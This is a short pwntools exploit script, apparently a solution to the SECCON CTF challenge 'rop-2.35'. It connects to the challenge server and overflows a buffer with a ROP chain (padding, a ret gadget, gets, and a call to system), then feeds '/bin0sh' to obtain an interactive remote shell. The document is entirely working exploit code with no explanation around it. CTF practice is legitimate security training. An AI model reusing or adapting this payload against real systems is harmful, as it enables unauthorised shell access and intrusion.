#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe
# io = process([exe.path])
# io = gdb.debug([exe.path], """
#     start
#     b *main+39
#     b *main+46
# """)
io = remote('rop-2-35.seccon.games', '9999')

gets = 0x401060
ret = 0x40101a
call_system = 0x40116c

offset = 24
payload = b''
payload += b'A' * offset
payload += pack(ret)
payload += pack(gets)
payload += pack(call_system)

io.recvuntil(b'Enter something:')
io.sendline(payload)
# なぜか一つずれるので /bin/sh → /bin0sh
io.sendline(b'/bin0sh')
io.interactive()
